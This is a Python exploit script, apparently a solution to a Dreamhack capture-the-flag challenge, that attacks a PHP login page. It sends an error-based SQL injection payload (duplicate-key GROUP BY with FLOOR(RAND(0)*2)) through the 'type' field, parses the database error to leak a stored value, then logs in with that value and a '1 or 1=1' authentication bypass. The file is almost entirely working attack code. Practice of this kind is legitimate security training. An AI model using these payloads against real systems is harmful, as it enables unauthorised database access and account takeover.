import requests
from binascii import hexlify
import re

TARGET_URL = 'http://host1.dreamhack.games:23340'

def request(id,pw,type):
    data = {
        "id":id,
        "pw":pw,
        "type":type
    }

    res = requests.post(f"{TARGET_URL}/login_ok.php",data=data)

    return res.text

def getIP():
    f = requests.request('GET', 'http://myip.dnsomatic.com')
    ip = f.text
    print(ip)
    return ip

def sqli(cols):
    for i in range(0,len(cols)):
        if isinstance(cols[i], str):
            if(len(cols[i])>0):
                if(cols[i][0]=="'") and (cols[i][len(cols[i])-1]=="'"): 
                    cols[i]="0x"+hexlify(cols[i].encode('utf-8')).decode('utf-8')

    separator = ",0x20,"
    payload = f"1 or (1,1)=(SELECT count(*), CONCAT({separator.join(cols)},0x3a,FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x)"

    print(payload)
    res = request(getIP(),'navy',payload)

    print(res)
    result=[]
    result = re.findall(r"<script>alert\(\"DB Error :: Duplicate entry '(.*):[0-1]' for key 'group_key'\"\);window\.location\.href='\./';</script>",res)

    #if len(result)>0:
    #    for i in result:
    #        print(i)

    return result

cols = ["ps"]

result = sqli(cols)

if(result):
    print(result[0])
    print(request(getIP(),result[0],'1 or 1=1-- 1'))